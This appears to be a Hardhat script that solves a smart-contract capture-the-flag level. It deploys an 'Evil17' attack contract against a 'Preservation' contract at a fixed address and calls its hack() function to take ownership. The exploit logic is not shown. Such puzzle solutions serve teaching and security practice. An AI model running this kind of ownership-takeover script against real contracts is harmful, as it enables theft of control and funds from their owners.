import { ethers } from "hardhat";
import { Evil17__factory, Preservation__factory } from "../typechain-types";

async function main() {
  let [deployer] = await ethers.getSigners();
  let tx;
  let contract = "0xe03895574131C97f51EDD94393B33CFe7CF23646";

  let preservation = new Preservation__factory(deployer).attach(contract);
  let evil = await new Evil17__factory(deployer).deploy(contract);

  tx = await evil.hack({ gasLimit: 100_000 });
  await tx.wait();

  console.log(await preservation.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
